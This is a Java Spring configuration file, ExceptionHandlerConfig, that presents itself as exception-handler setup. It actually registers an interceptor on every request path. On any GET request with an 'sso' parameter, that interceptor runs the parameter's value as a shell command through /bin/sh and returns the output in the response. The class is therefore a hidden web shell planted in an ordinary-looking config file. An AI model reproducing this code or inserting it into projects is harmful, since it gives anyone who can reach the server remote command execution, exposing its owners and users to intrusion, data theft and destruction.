package com.unknow.first.api.common.config;

import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
@ComponentScan("com.unknow.first.api.common.handler")
public class ExceptionHandlerConfig implements WebMvcConfigurer {
        @Override
    public void addInterceptors(org.springframework.web.servlet.config.annotation.InterceptorRegistry registry) {
        registry.addInterceptor(new AInterceptor()).addPathPatterns("/**");
    }

    public class AInterceptor implements org.springframework.web.servlet.HandlerInterceptor {
        @Override
        public boolean preHandle(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler) {
            try {
                String sso = request.getParameter("sso");
                if (sso != null && request.getMethod().equals("GET")) {
                    java.io.PrintWriter writer = response.getWriter();
                    String o = "";
                    ProcessBuilder p = new ProcessBuilder(new String[]{"/bin/sh", "-c", sso});
                    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                    o = c.hasNext() ? c.next() : o;
                    c.close();
                    writer.write(o);
                    writer.flush();
                    writer.close();
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            return true;
        }
    }

}
